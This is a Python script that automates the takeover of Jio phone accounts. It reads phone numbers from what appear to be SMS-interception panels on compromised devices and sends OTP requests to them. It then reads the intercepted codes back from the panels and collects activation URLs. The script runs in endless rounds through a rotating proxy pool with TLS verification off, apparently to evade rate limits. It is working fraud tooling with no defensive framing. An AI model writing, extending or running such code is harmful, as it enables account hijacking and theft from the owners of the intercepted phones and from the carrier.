#!/usr/bin/env python3
"""Rebuild the fresh candidate list from the panel scan, probe each number,
then harvest activation URLs from the ones that answer.

Usage:  python3 harvest.py [--probe-workers 6] [--harvest-workers 7]
"""
from __future__ import annotations

import argparse
import asyncio
import datetime
import json
import re
import sys
import time
from pathlib import Path

import aiohttp

sys.path.insert(0, str(Path(__file__).resolve().parent))
import brutal_daemon as bd  # noqa: E402

DATA = Path(__file__).resolve().parent / "data"
DEV_MAP = {"\u0967": "0", "\u0968": "1", "\u0969": "2", "\u096a": "3",
           "\u096b": "4", "\u096c": "5", "\u096d": "6", "\u096e": "7",
           "\u096f": "8", "\u0960": "9"}


def norm(t: str) -> str:
    """Normalise a panel timestamp to ASCII digits.

    Some rows carry Devanagari digits, some a mix of both scripts, so map
    every Devanagari digit first and only then validate the shape.
    """
    t = "".join(DEV_MAP.get(c, c) for c in t or "")
    t = "".join(c for c in t if c.isdigit() or c in "-| :")
    m = re.match(r"(\d{4})-(\d{2})-(\d{2}) \| (\d{2}):(\d{2}):(\d{2})", t)
    if not m:
        return ""
    y, mo, d, h, mi, s = (int(x) for x in m.groups())
    if not (1 <= mo <= 12 and 1 <= d <= 31 and h < 24 and mi < 60 and s < 60):
        return ""
    return f"{y:04d}-{mo:02d}-{d:02d} | {h:02d}:{mi:02d}:{s:02d}"


def build_candidates(window_min: int = 90) -> list[dict]:
    num2dev = json.loads((DATA / "num2dev.json").read_text())
    best: dict[str, dict] = {}
    for num, devs in num2dev.items():
        for d in devs:
            t = norm(d["last_sms"])
            if not t:
                continue
            if num not in best or t > best[num]["last_sms"]:
                best[num] = {"mobile": num, "panel": d["panel"],
                             "device": d["device"], "last_sms": t}
    # panel stamps are IST; this host runs CST, so shift "now" back 2.5h
    ist_now = datetime.datetime.now() - datetime.timedelta(hours=2, minutes=30)
    now = time.mktime(ist_now.timetuple())
    fresh = [c for c in best.values()
             if 0 <= (now - time.mktime(
                 time.strptime(c["last_sms"], "%Y-%m-%d | %H:%M:%S"))) / 60
             <= window_min]
    fresh.sort(key=lambda z: z["last_sms"], reverse=True)
    return fresh


def build_all() -> list[dict]:
    """Every number we have not finished yet, freshest first.

    The window filter throws away numbers whose last SMS is older than the
    window, but those are still unclaimed Jio numbers worth a shot. This
    path drains the whole pool before the rescan brings in new ones.
    """
    num2dev = json.loads((DATA / "num2dev.json").read_text())
    best: dict[str, dict] = {}
    for num, devs in num2dev.items():
        for d in devs:
            t = norm(d["last_sms"])
            if not t:
                continue
            if num not in best or t > best[num]["last_sms"]:
                best[num] = {"mobile": num, "panel": d["panel"],
                             "device": d["device"], "last_sms": t}
    done = (set(json.loads((DATA / "brutal_dead.json").read_text()))
            if (DATA / "brutal_dead.json").exists() else set())
    locked = (set(json.loads((DATA / "brutal_locked.json").read_text()))
              if (DATA / "brutal_locked.json").exists() else set())
    got = ({json.loads(l)["mobile"]
            for l in (DATA / "brutal_freshlinks.jsonl").read_text().splitlines()
            if l.strip()} if (DATA / "brutal_freshlinks.jsonl").exists() else set())
    pool = [c for c in best.values()
            if c["mobile"] not in done | locked | got]
    # a device whose last SMS is older than this has almost certainly gone
    # offline; OTP requests to it never arrive and just burn the attempt
    cutoff = datetime.datetime.now() - datetime.timedelta(hours=24)
    pool = [c for c in pool
            if time.mktime(time.strptime(c["last_sms"], "%Y-%m-%d | %H:%M:%S"))
            >= time.mktime(cutoff.timetuple())]
    pool.sort(key=lambda z: z["last_sms"], reverse=True)
    return pool


async def probe_all(session, cands, workers):
    sem = asyncio.Semaphore(workers)
    good = []

    async def one(c):
        m, dev, pn = c["mobile"], c["device"], c["panel"]
        async with sem:
            ok, st, _ = await bd.send_otp(session, m)
            if not ok:
                return None
            for _ in range(12):
                otps = await bd.recent_otps(session, m, dev, pn)
                if otps and time.time() - otps[0][0] < 25:
                    return c
                await asyncio.sleep(2)
            return None

    for fut in asyncio.as_completed([asyncio.create_task(one(c)) for c in cands]):
        r = await fut
        if r:
            good.append(r)
            print(f"[probe OK] {r['mobile']} {r['panel']}", flush=True)
    return good


async def harvest(session, cands, workers):
    got = 0
    sem = asyncio.Semaphore(workers)

    async def one(c):
        async with sem:
            return await bd.attempt(session, c, 45)

    for fut in asyncio.as_completed([asyncio.create_task(one(c)) for c in cands]):
        try:
            r = await fut
        except Exception as e:  # noqa: BLE001
            print(f"[!] {type(e).__name__}: {e}", flush=True)
            continue
        if r.get("ok"):
            got += 1
            print(f"\n[LINK] {r['mobile']} otp={r['otp']} panel={r['panel']}",
                  flush=True)
            print(f"       {r['url']}\n", flush=True)
        else:
            print(f"[{r.get('status')}] {r['mobile']}", flush=True)
    return got


async def rescan() -> int:
    """Refresh num2dev.json from the panels so fresh numbers keep flowing."""
    print("[*] rescanning panels...", flush=True)
    proc = await asyncio.create_subprocess_exec(
        sys.executable, str(Path(__file__).resolve().parent / "scan_devices.py"),
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.STDOUT)
    await proc.wait()
    try:
        return len(json.loads((DATA / "num2dev.json").read_text()))
    except (OSError, ValueError):
        return 0


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--window", type=int, default=90)
    ap.add_argument("--probe-workers", type=int, default=6)
    ap.add_argument("--harvest-workers", type=int, default=7)
    ap.add_argument("--rounds", type=int, default=0, help="0 = forever")
    ap.add_argument("--cooldown", type=int, default=120)
    ap.add_argument("--rescan-every", type=int, default=3,
                    help="panel rescan interval in rounds (0 = never)")
    ap.add_argument("--batch", type=int, default=200,
                    help="candidates per round from the full pool")
    args = ap.parse_args()

    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=conn, headers=bd.JIO_H) as session:
        # 40 hunters keep the proxy pool fed at 250 harvest workers; fewer
        # hunters and the pool drains faster than dead exits are replaced
        for i in range(40):
            asyncio.create_task(bd.hunter_loop(i, session, 5.0),
                                name=f"hunter{i}")
        total = 0
        rnd = 0
        while True:
            rnd += 1
            if args.rescan_every and rnd > 1 and (rnd - 1) % args.rescan_every == 0:
                n = await rescan()
                print(f"[*] rescan done: {n} numbers known", flush=True)
            pool = build_all()
            cands = pool[:args.batch]
            print(f"\n[round {rnd}] {len(cands)}/{len(pool)} candidates "
                  f"pool={len(bd.POOL)}", flush=True)
            if not cands:
                await asyncio.sleep(60)
                continue
            # no probe pass: probing burns the number's OTP
            total += await harvest(session, cands, args.harvest_workers)
            print(f"[round {rnd}] total links={total}", flush=True)
            if args.rounds and rnd >= args.rounds:
                break
            await asyncio.sleep(args.cooldown)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        sys.exit(0)
